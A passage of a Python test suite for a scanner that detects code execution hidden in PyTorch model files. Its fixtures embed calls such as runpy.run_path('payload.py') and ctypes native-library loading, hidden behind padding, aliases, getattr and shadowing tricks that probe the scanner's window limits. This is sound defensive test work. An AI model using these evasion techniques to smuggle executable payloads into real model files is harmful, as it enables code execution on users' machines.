            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n"
            + filler
            + b"runpy.__dict__['run_path'] = runpy.run_module\n"
            + filler
            + b"def payload():\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_safe_middle_state_is_omitted(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            + filler
            + b"runpy.run_path = len\n"
            + filler
            + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xffimport runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_comment_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp  # (\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_string_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffimport runpy as rp; marker = "("\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_priority_import_in_function_context(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_alias_call_after_import_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_report_safe_late_priority_overwrite_from_compact_span(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy\n"
            + b"    runpy.run_path = len\n"
            + b"    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy as rp\n" + padding + b'    text = """\n'
            b"    rp.run_path('payload.py')\n"
            b'    """\n'
            b"    return 1\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_rebound_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path = runpy.run_module\n"
            b"rp.run_path('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_call_between_compact_priority_segments(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_before = b"# before\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# before\n") + 8
        )
        padding_after = b"# after\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# after\n") + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import os\n"
            + padding_before
            + b"runpy.run_path('payload.py')\n"
            + padding_after
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_alias_call_after_non_call_alias_use(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"rp.other = 1\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy\nrun = runpy.run_path\n" + padding + b"run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_shadowed_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + b"run = len\n"
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_block",
        [
            b"del c\n",
            b"(c := len)\n",
            b"for c in [len]:\n    pass\n",
            b"with contextlib.suppress(Exception) as c:\n    pass\n",
        ],
    )
    def test_scan_model_honors_late_ctypes_alias_shadowing_after_priority_window(self, shadow_block: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\nimport contextlib\n"
            + padding
            + shadow_block
            + padding
            + b"c.CDLL('libpayload.so')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_dead_branch_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"if False:\n    import runpy as rp\n"
            + padding
            + b"rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_indented_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = (
            b"\x00\xff" + leading_blocks + b"if True:\n" + b"    import runpy\n" + b"    runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "compound_payload",
        [
            b"if flag:\n    pass\nelse:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nexcept Exception:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nfinally:\n    import runpy\n    runpy.run_path('payload.py')\n",
        ],
    )
    def test_scan_model_detects_clause_priority_import_after_default_cap(self, compound_payload: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + compound_payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_alias_comparisons_before_late_priority_attribute_load(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        comparisons = b"".join(
            b"c == None\n" for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + comparisons + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize("filler_line", [b"foo(c=1)\n", b"obj.c = 1\n"])
    def test_scan_model_ignores_nonbinding_alias_syntax_before_late_priority_attribute_load(
        self, filler_line: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        filler = filler_line * jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + filler + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    def test_scan_model_bounds_shadow_only_priority_lines_before_late_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\n"
            + padding
            + shadows
            + b"import ctypes as c\n"
            + b"c.cdll.msvcrt\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_line",
        [
            b"run, other = len, 1\n",
            b"(run) = len\n",
            b"[run] = [len]\n",
            b"other, (run, final) = 1, (len, 2)\n",
            b"*run, other = [len], 1\n",
        ],
    )
    def test_scan_model_honors_destructured_alias_shadowing_before_late_priority_call(self, shadow_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_line
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_import",
        [
            b"import math as run\n",
            b"from math import sqrt as run\n",
        ],
    )
    def test_scan_model_honors_import_alias_shadowing_before_late_priority_call(self, shadow_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_import
            + padding
            + b"run(1)\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_shadow_only_priority_lines(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * 512
        shadow_candidate = shadows + b"import ctypes as c\nc.cdll.msvcrt\n"
        usage_lines = jit_script_module._priority_alias_usage_lines(shadow_candidate, frozenset({b"c"}), 0)
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + shadow_candidate

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert len(usage_lines) <= jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "clause_source",
        [
            (b"def payload(flag):\n    if flag:\n        return None\n    else:\n        # pad\n"),
            (b"def payload():\n    try:\n        return None\n    except Exception:\n        # pad\n"),
            (b"def payload():\n    try:\n        value = 1\n    finally:\n        # pad\n"),
        ],
    )
    def test_scan_model_detects_deep_priority_import_inside_compound_clauses(self, clause_source: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"        # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + clause_source
            + padding
            + b"        import runpy as rp\n"
            + b"        return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_multiple_shadowed_aliases_before_late_safe_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + b"c = runpy._run_module_as_main\n"
            + padding
            + b"a = len\n"
            + b"b = len\n"
            + b"c = len\n"
            + b"a([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_live_alias_call_on_shadow_line(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_same_line_safe_shadow_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; a([])\n"
            + padding
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(
            b"a = len; a([])\n" + padding for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_indented_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(
            b"    a = len; a([])\n" + padding for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + b"    import runpy\n"
            + b"    a = runpy.run_path\n"
            + b"    b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"    return b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_call_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + padding
            + b"a('payload.py'); a = len\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_alias_capture_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as a\n"
            + padding
            + b"b = a.run_path; a = len\n"
            + padding
            + b"b('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_unrelated_assignment_alias_before_delayed_priority_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\nx = 1\n"
            + padding
            + b"x()\n"
            + padding
            + b"rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_function_local_assignment_alias_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy\n"
            b"    run = runpy.run_path\n" + padding + b"    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_getattr_priority_alias_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"getattr(rp, 'run_path')('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_wildcard_import_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"from runpy import *\n" + padding + b"run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_hit_in_compacted_priority_gap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import os\n" + padding + b"runpy.run_path('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_later_priority_alias_pair_inside_same_block(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
